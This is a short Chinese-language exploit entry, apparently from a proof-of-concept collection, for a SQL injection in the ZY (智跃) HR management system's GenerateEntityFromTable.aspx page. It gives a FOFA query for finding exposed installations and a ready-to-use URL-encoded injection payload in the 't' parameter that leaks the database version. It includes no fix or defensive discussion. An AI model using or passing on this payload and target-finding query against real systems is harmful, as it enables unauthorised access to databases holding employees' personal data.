## 智跃人力资源管理系统GenerateEntityFromTable.aspx SQL漏洞

## fofa
```
app="ZY-人力资源管理系统"
```

## poc
```
http://127.0.0.1:8085/resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select+@@version))%2B%27
```

